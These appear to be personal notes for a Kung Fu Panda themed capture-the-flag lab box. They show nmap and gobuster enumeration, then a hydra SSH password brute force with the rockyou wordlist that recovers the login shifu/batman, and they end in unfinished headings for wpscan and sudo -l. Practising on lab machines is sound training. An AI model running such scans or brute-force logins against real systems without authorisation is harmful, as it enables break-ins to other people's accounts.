### [[nmap]]
basic [[nmap]] scan 
```bash
$ nmap 10.10.99.186

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 10:54 EDT
Nmap scan report for 10.10.99.186
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8009/tcp open  ajp13
8080/tcp open  http-proxy
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 61.99 seconds
```

ip:22 reveals KungFu Panda image
source reveals _shifu loves noodles_

run nmap -aggressive -T4/aggressive -p-/all ports 

```bash
nmap -A -T4 -p- 10.10.71.93
```

view _ip_:80
shifu loves noodles

### robots.txt
_ip_:robots.txt
reveals panda.thm

add panda.thm to etc/hosts
```bash
ip.ip.ip.ip panda.thm 
```

### gobuster
run gobuster on _ip_
```bash
gobuster dir -u http://10.10.99.186 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
reveals directories 
	wordpress
	flag
	
### hydra
hydra 
```bash
hydra -l shifu -P /usr/share/wordlists/rockyou.txt ssh://10.10.99.186 

```
reveal
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-02 09:17:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.153.168:22/
[STATUS] 181.00 tries/min, 181 tries in 00:01h, 14344223 to do in 1320:50h, 16 active
[22][ssh] host: 10.10.153.168   login: shifu   password: batman
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-02 09:18:53
```

[[ssh]] into shifu/batman


### 
wpscan


Sudo -l

